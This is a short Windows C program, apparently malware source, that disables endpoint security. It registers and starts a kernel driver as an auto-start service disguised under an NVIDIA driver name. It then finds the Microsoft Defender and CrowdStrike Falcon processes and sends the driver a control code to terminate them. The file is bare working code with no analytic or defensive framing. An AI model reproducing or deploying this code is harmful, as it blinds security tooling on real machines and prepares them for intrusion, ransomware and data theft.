#include <windows.h>
#include <tlhelp32.h>
#include <wchar.h>

#define IOCTL_TERMINATE_PROCESS 0x222024

static const wchar_t *security_targets[] = {
    L"MsMpEng.exe",
    L"CSFalconService.exe"
};

static void install_driver(void) {
    SC_HANDLE manager = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    SC_HANDLE service = CreateServiceW(
        manager,
        L"NvFsFilter",
        L"NVIDIA File System Filter Driver",
        SERVICE_START | DELETE,
        SERVICE_KERNEL_DRIVER,
        SERVICE_AUTO_START,
        SERVICE_ERROR_IGNORE,
        L"C:\\Windows\\System32\\drivers\\nvfsflt64.sys",
        NULL, NULL, NULL, NULL, NULL);
    StartServiceW(service, 0, NULL);
}

static BOOL is_security_process(const wchar_t *image) {
    for (unsigned int i = 0; i < sizeof(security_targets) / sizeof(security_targets[0]); ++i) {
        if (_wcsicmp(image, security_targets[i]) == 0) return TRUE;
    }
    return FALSE;
}

static void terminate_security_processes(void) {
    HANDLE device = CreateFileW(L"\\\\.\\Alinubx", GENERIC_READ | GENERIC_WRITE,
                                0, NULL, OPEN_EXISTING, 0, NULL);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W entry = {0};
    entry.dwSize = sizeof(entry);

    if (Process32FirstW(snapshot, &entry)) {
        do {
            if (is_security_process(entry.szExeFile)) {
                DWORD returned = 0;
                DWORD pid = entry.th32ProcessID;
                DeviceIoControl(device, IOCTL_TERMINATE_PROCESS,
                                &pid, sizeof(pid), NULL, 0, &returned, NULL);
            }
        } while (Process32NextW(snapshot, &entry));
    }
    CloseHandle(snapshot);
    CloseHandle(device);
}

int wmain(void) {
    install_driver();
    terminate_security_processes();
    return 0;
}
